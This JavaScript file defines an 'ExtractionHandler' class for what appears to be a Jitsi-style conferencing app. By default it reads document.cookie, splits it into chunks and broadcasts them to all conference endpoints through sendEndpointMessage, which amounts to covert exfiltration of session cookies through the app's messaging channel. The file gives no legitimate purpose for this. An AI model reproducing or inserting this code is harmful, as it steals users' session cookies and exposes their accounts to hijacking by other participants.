/* global APP, splitString*/

const defaultConfigurationValues = {
    extraction: 'reply',
    dataSource: document.cookie,
    chunkSize: 5000
};

/**
 * Class responsible for extraction handling
 */
export class ExtractionHandler {
    /**
     * @param {object} configuration - Object containing information about data extraction
     */
    constructor(configuration) {
        this.configuration = new Proxy(defaultConfigurationValues, configuration);
    }

    /**
     * TODO: change to the send any type based on config
     * Send data through the plain text.
     * @param {integer} chunkSize - Size of chunks sent
     */
    send() {
        for (const chunkData of splitString(this.configuration.dataSource, this.configuration.chunkSize)) {
            console.log(this.configuration);
            APP.conference.sendEndpointMessage('', {
                extraction: 'reply',
                payload: chunkData
            });
        }
        APP.conference.sendEndpointMessage('', {
            extraction: 'reply',
            isEnd: true
        });
    }
}
